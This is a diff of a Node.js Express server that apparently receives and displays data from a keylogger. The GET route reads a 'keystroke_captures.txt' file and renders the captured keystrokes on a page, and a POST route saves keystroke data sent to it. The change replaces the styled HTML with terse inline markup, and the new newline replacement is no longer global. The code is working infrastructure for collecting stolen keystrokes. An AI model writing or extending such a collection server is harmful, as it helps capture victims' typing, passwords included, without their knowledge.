@@ -16,75 +16,12 @@ app.get("/", (req, res) => {
         const kl_file = fs.readFileSync("./keystroke_captures.txt", { encoding: 'utf8', flag: 'r' });
         
         // Replace newline characters with <br> for HTML formatting
-        res.send(`
-            <html>
-            <head>
-                <style>
-                    body {
-                        font-family: Arial, sans-serif;
-                        margin: 0;
-                        padding: 0;
-                        background-color: #f4f4f4;
-                    }
-                    .container {
-                        max-width: 800px;
-                        margin: 20px auto;
-                        padding: 20px;
-                        background-color: #fff;
-                        border-radius: 8px;
-                        box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
-                    }
-                    h1 {
-                        color: #333;
-                    }
-                    p {
-                        color: #666;
-                    }
-                </style>
-            </head>
-            <body>
-                <div class="container">
-                    <h1>Logged data</h1>
-                    <p>${kl_file.replace(/\n/g, "<br>")}</p>
-                </div>
-            </body>
-            </html>
-        `);
+        res.send(`<h1 style="color: #3366cc;">Captures</h1><p style="color: #009900;">${kl_file.replace("\n", "<br>")}</p>`);
     } catch {
         // If file doesn't exist or any error occurs, send a message indicating no data
-        res.send(`
-            <html>
-            <head>
-                <style>
-                    body {
-                        font-family: Arial, sans-serif;
-                        margin: 0;
-                        padding: 0;
-                        background-color: #f4f4f4;
-                    }
-                    .container {
-                        max-width: 400px;
-                        margin: 20px auto;
-                        padding: 20px;
-                        background-color: #fff;
-                        border-radius: 8px;
-                        box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
-                    }
-                    h1 {
-                        color: #333;
-                    }
-                </style>
-            </head>
-            <body>
-                <div class="container">
-                    <h1>Nothing Logged yet.</h1>
-                </div>
-            </body>
-            </html>
-        `);
+        res.send("<h1 style='color: #cc0000;'>Still Capturing......</h1>");
     }
 });
-
 
 // Route to handle POST requests and save the keystrokes data
 app.post("/", (req, res) => {
